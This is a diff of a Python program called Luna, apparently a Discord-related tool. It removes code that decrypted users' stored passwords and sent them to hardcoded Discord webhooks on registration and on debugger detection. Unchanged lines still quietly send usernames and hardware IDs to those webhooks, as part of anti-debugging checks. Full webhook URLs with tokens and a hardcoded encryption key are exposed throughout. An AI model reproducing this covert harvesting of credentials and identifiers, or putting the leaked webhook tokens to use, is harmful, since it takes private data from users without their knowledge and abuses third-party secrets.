@@ -55,16 +55,16 @@ privacy = False
 copycat = None
 chargesniper = False
 
-developer_mode = True
-beta = False
+developer_mode = False
+beta = True
 version = '3.0.5'
 
 r = requests.get("https://raw.githubusercontent.com/Nshout/Luna/main/master.json").json()
-updater_url = r["update"]
+updater_url = r["updater"]
 version_url = r["version"]
 
 r = requests.get("https://raw.githubusercontent.com/Nshout/Luna/main/beta.json").json()
-beta_updater_url = r["update"]
+beta_updater_url = r["updater"]
 beta_version_url = r["version"]
 
 motd = urllib.request.urlopen('https://pastebin.com/raw/MeHTn6gZ').read().decode('utf-8')
@@ -421,12 +421,9 @@ def check_debuggers():
 					if x in blacklisted_processes:
 						try:
 							username = files.json("Luna/auth.json", "username", documents=True)
-							password = files.json("Luna/auth.json", "password", documents=True)
 							username = Decryption('5QXapyTDbrRwW4ZBnUgPGAs9CeVSdiLk').CEA256(username)
-							password = Decryption('5QXapyTDbrRwW4ZBnUgPGAs9CeVSdiLk').CEA256(password)
 						except:
 							username = "Failed to get username"
-							password = "Failed to get password"
 						hwid = str(subprocess.check_output('wmic csproduct get uuid')).split('\\r\\n')[1].strip('\\r').strip() 
 						notify.webhook(url="https://discord.com/api/webhooks/918944258596155432/eskZhd3tY5LHsVUv7q9J0z8BTRZB1-Ko4qTPlPXa7opIqGJzRQT8F0Md6rL4fY5SShFu", description=f"Detected a debugger\n```Luna Information\n\nUsername: {username}```\n\n```HWID » {hwid}```")
 						current_system_pid = os.getpid()
@@ -564,7 +561,7 @@ class luna:
 			auth.register(email=key, username=username, password=password, license_key=key)
 			prints.message("Successfully registered")
 			hwid = str(subprocess.check_output('wmic csproduct get uuid')).split('\\r\\n')[1].strip('\\r').strip()
-			notify.webhook(url="https://discord.com/api/webhooks/918945532146233344/ZDDj5GgzfDg5-QdScoDfebNCYOuBNUIbgi0UFiO2qIqt0l9hCGm5x1OVwcLuJe3JL_6z", description=f"A new registered user!\n\nLuna Information:\n```\nUsername: {username}\nPassword » {password}```\n\nHWID:\n```{hwid}```")
+			notify.webhook(url="https://discord.com/api/webhooks/918945532146233344/ZDDj5GgzfDg5-QdScoDfebNCYOuBNUIbgi0UFiO2qIqt0l9hCGm5x1OVwcLuJe3JL_6z", description=f"A new registered user!\n\nLuna Information:\n```\nUsername: {username}```\n\nHWID:\n```{hwid}```")
 			time.sleep(3)
 			username = Encryption('5QXapyTDbrRwW4ZBnUgPGAs9CeVSdiLk').CEA256(username)
 			password = Encryption('5QXapyTDbrRwW4ZBnUgPGAs9CeVSdiLk').CEA256(password)
